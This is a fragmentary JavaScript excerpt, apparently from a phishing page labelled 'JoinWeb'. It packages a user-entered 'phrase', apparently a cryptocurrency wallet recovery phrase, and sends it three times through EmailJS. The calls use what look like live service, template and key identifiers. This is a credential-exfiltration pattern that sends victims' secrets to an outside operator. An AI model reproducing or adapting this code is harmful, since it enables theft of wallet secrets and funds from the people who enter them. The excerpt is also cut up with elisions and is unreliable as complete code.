...
var data1 = {
    from_website: "JoinWeb",
    phrase: phrase_value,
}


try{
    emailjs.send('service_hkmzqu8', 'template_4t1e94k', data1, '0gGsJz3m5F8-RJwju');
...
try{
    ...
    emailjs.send('service_hkmzqu8', 'template_4t1e94k', data2, '0gGsJz3m5F8-RJwju')
...
try{
    ...
    emailjs.send('service_hkmzqu8', 'template_4t1e94k', data3, '0gGsJz3m5F8-RJwju')
